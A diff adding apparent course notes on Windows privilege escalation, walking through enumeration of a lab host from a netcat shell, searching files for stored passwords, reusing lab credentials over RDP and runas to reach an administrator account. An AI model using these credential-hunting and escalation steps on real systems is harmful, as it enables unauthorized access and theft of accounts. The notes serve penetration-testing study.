@@ -56,4 +56,343 @@ Since Windows Vista, processes run on the following integrity levels:
 - Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
 - Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
 
-Process Explorer can show us the integrity level of processes
+Process Explorer can show us the integrity level of processes for our current user with "$ whoami /groups" and for files, "$ icacls".
+
+Lastly, User Account Control (UAC) is a Windows security feature protecting the OS by running most tasks and apps with standard user privileges, EVEN if the user is launching them as Administrator. The administrative user obtains two access tokens after logging on, the first being a standard user token (filtered admin token), which is used to perform all non-privileged operations, and the second token being a regular administrative token. To leverage the admin token, a UAC consent prompt has to be confirmed. 
+
+### Situational Awareness
+
+Always obtain the following information before continuing with attacks:
+- Username and hostname
+- Group memberships of the current user
+- Existing users and groups
+- Operating system, version and architecture
+- Network information
+- Installed applications
+- Running processes
+
+First, check users and groups.
+
+```console
+$ nc 192.168.50.220 4444
+
+// running as dave on a client, not a server. the hostname can tell us a lot - ex: WEB01 is a web server and MSSQL01 is a MSSQL1 server.
+
+C:\Users\dave>whoami
+whoami
+clientwk220\dave
+
+// help desk often have higher permissions...
+
+C:\Users\dave> whoami /groups
+CLIENTWK220\helpdesk
+BUILTIN\Remote Desktop Users
+
+// let's look at other users. daveAdmin note - admins often have one privileged account and one non--privileged account
+
+C:\Users\dave> powershell
+PS C:\Users\dave> Get-LocalUser
+BackupAdmin
+dave
+daveAdmin
+steve
+
+// let's look at groups. backup solutions tend to have extensive perms... however, Backup Operators are standard groups who can backup and restore all files on a computer, even ones they don't have perms for. Don't confuse this group with non-standard backup groups.
+// members of Remote Desktop Users access the system with rdp, while members of Remote Managemnet Users access with WinRM.
+
+PS C:\Users\dave> Get-LocalGroup
+adminteam                  Members of this group are admins to all workstations on the second floor
+BackupUsers 
+helpdesk
+
+// look at users of adminteam. adminteam is nont in the group of Administrators...
+
+PS C:\Users\dave> Get-LocalGroupMember adminteam
+User        CLIENTWK220\daveadmin Local 
+
+PS C:\Users\dave> Get-LocalGroupMember Administrators
+User        CLIENTWK220\Administrator Local          
+User        CLIENTWK220\daveadmin     Local
+User        CLIENTWK220\backupadmin     Local  
+User        CLIENTWK220\offsec        Local
+```
+
+Now, check OS architecture.
+
+```console
+// build 22000 is the version 21H2 of Windows 11. we're running a 64-bit system, meaning we can run 64-bit binaries on this system. You cannot run 64-bit binaries on 32-bit systems. 
+
+PS C:\Users\dave> systeminfo
+Host Name:                 CLIENT220
+OS Name:                   Microsoft Windows 11 Pro
+OS Version:                10.0.22000 N/A Build 22000
+...
+System Type:               x64-based PC
+...
+
+// list all ntwk interfaces. this system's ip was not generated from DCHP, but was set manually. useful information include the DNS server, gateway, subnect mask, and MAC address.
+PS C:\Users\dave> ipconfig /all
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : clientwk220
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-8A-80-16
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::cc7a:964e:1f98:babb%6(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.50.220(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.50.254
+   DHCPv6 IAID . . . . . . . . . . . : 234901590
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-3B-F7-25-00-50-56-8A-80-16
+   DNS Servers . . . . . . . . . . . : 8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+// get routing table to see potential attack vectors to other systems
+PS C:\Users\dave> route print
+route print
+===========================================================================
+Interface List
+  6...00 50 56 8a 80 16 ......vmxnet3 Ethernet Adapter
+  1...........................Software Loopback Interface 1
+===========================================================================
+
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0   192.168.50.254   192.168.50.220    271
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+     192.168.50.0    255.255.255.0         On-link    192.168.50.220    271
+   192.168.50.220  255.255.255.255         On-link    192.168.50.220    271
+   192.168.50.255  255.255.255.255         On-link    192.168.50.220    271
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link    192.168.50.220    271
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+  255.255.255.255  255.255.255.255         On-link    192.168.50.220    271
+===========================================================================
+Persistent Routes:
+  Network Address          Netmask  Gateway Address  Metric
+          0.0.0.0          0.0.0.0   192.168.50.254  Default 
+===========================================================================
+...
+
+// list all active ntwk connections. this system is probably running a webserver on 80 and 443. 3306 indicates a MySQL server. we see our netcat conn on port 4444, and an RDP conn from someone else on port 3389. that means there is another user on this same system, and once we elevate privileges, we can use Mimikatz to try to get that user's creds.
+
+PS C:\Users\dave> netstat -ano
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       6824
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       960
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       6824
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1752
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1084
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       3288
+...
+  TCP    192.168.50.220:139     0.0.0.0:0              LISTENING       4
+  TCP    192.168.50.220:3389    192.168.119.4:33060    ESTABLISHED     1084
+  TCP    192.168.50.220:4444    192.168.119.3:51082    ESTABLISHED     2044
+...
+
+// check installed applications by querying 2 registry keys, asking for bot 32bit and 64bit apps
+// we see the keepass password manager, 7-zip, and XAMPP.
+// after we finish our situational awareness, look these up for public exploits and try to get the master password of the password manager to try to get privileged account creds.
+
+PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
+displayname                                                       
+-----------                                                       
+KeePass Password Safe 2.51.1                                      
+Microsoft Edge                                                    
+Microsoft Edge Update                                             
+Microsoft Edge WebView2 Runtime                                   
+...
+Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913
+Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913    
+Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913       
+Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913
+
+PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+DisplayName                                                   
+-----------                                                   
+7-Zip 21.07 (x64)                                             
+...
+XAMPP
+VMware Tools                                                  
+Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29913
+Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29913  
+
+// we MUST also check the 32 and 64 bits in C:\Program Files and the Downloads directory!
+
+// now see which are currently running
+// we can infer that the Apache and MySQL servers were both started through XAMPP.
+
+PS C:\Users\dave> Get-Process
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                               
+-------  ------    -----      -----     ------     --  -- -----------                                                
+     49      12      528       1152       0.03   2044   0 access
+...
+    477      49    17328      23904              6068   0 httpd
+    179      29     9608      19792              6824   0 httpd
+...                                                 
+    174      16   210620      29048              1752   0 mysqld
+...                                                  
+    825      40    75804      14404       5.91   6332   0 powershell
+...                                                
+    379      24     6864      30236              2272   1 xampp-control
+...
+```
+
+Extra examples: 
+
+Get the path of a running processes' binary:
+
+```console
+$ Get-Process NonStandardProcess | Select-Object Path
+```
+
+### Hidden in Plain View
+
+When browsing a home dir of our user of public folders, we can find sensitive information, like passwords, that provide us  vector for privilege escalation. Definitely look in meeting notes, config files, or onboarding documents!
+
+We know that KeePass and XAMPP are on the system, so we should search for password manager databases and config files for these apps.
+
+```console
+// no hits?
+
+PS C:\Users\dave> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+// try XAMPP config files - found passwords.txt!
+
+PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Directory: C:\xampp\mysql\bin
+
+Mode                 LastWriteTime         Length Name                                               
+----                 -------------         ------ ----                                               
+-a----         6/16/2022   1:42 PM           5786 my.ini
+...
+Directory: C:\xampp
+
+Mode                 LastWriteTime         Length Name                                              
+----                 -------------         ------ ----                                                                 
+-a----         3/13/2017   4:04 AM            824 passwords.txt
+-a----         6/16/2022  10:22 AM            792 properties.ini     
+-a----         5/16/2022  12:21 AM           7498 readme_de.txt 
+-a----         5/16/2022  12:21 AM           7368 readme_en.txt     
+-a----         6/16/2022   1:17 PM           1200 xampp-control.ini  
+
+// turns out they are only the unmodified default passwords of XAMPP, and below we can see we don't have permission to view the contents of C:\xampp\mysql\bin\my.ini
+
+PS C:\Users\dave> type C:\xampp\passwords.txt
+### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+...
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+...
+
+PS C:\Users\dave> type C:\xampp\mysql\bin\my.ini
+type : Access to the path 'C:\xampp\mysql\bin\my.ini' is denied.
+At line:1 char:1
++ type C:\xampp\mysql\bin\my.ini
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\xampp\mysql\bin\my.ini:String) [Get-Content], UnauthorizedAccessEx 
+   ception
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.
+
+// check for docs in dave' home. 
+
+PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+    Directory: C:\Users\dave\Desktop
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                             
+-a----         6/16/2022  11:28 AM            339 asdf.txt
+
+
+PS C:\Users\dave> cat Desktop\asdf.txt
+cat Desktop\asdf.txt
+notes from meeting:
+
+- Contractors won't deliver the web app on time
+- Login will be done via local user credentials
+- I need to install XAMPP and a password manager on my machine 
+- When beta app is deployed on my local pc: 
+Steve (the guy with long shirt) gives us his password for testing
+password is: securityIsNotAnOption++++++
+
+// let's use steve's password. what groups is he a member of?
+
+PS C:\Users\dave> net user steve
+User name                    steve
+...
+Last logon                   6/16/2022 1:03:52 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *helpdesk             *Remote Desktop Users 
+                             *Remote Management Use*Users
+
+// while not an Admin, we can connect as Steve with RDP      
+
+$ xfreerdp /cert-ignore /bpp:8 /smart-sizing /compression -themes -wallpaper /auto-reconnect /drive:shared,/tmp /u:steve /p:securityIsNotAnOption++++++ /h:800 /w:1400 /v:192.168.227.221
+
+// try accessing the mysql binary as steve, since we couldn't as dave
+
+PS C:\Users\steve> type C:\xampp\mysql\bin\my.ini
+# Example MySQL config file for small systems.
+...
+
+# The following options will be passed to all MySQL clients
+# backupadmin Windows password for backup job
+[client]
+password       = admin123admin123!
+port=3306
+socket="C:/xampp/mysql/mysql.sock"
+
+// we have access, see a manually set password, and see a comment saying this is also the Windows password for backupadmin. go after backupadmin!
+
+S C:\Users\steve> net user backupadmin
+User name                    BackupAdmin
+...
+
+Local Group Memberships      *Administrators       *BackupUsers
+                             *Users
+Global Group memberships     *None
+The command completed successfully.
+
+// backupadmin is not a Remote Desktop User or Remote Management User. Find another way to access their system or execute commands as them.
+// we have gui access, so we can use Runas to run a program as a different user. Runas can be used with local or domain accounts so long as the uer has the ability to log on to the system.
+// Runas requires GUI access. However, we could use WinRM or RDP to access the system if the user is a member of the corresponding groups. Or, if the user has the "Log on as a batch job" access right, we can schedule a tast to execute a program of our choice as the user. Or, if the user has an active session, we can use PsExec from Sysinternals.
+
+PS C:\Users\steve> runas /user:backupadmin cmd
+Enter the password for backupadmin:
+Attempting to start cmd as user "CLIENTWK220\backupadmin" ...
+PS C:\Users\steve> 
+
+// new commandline window appears as backupadmin
+
+C:\Windows\system32> whoami
+clientwk220\backupadmin
+```
+
+
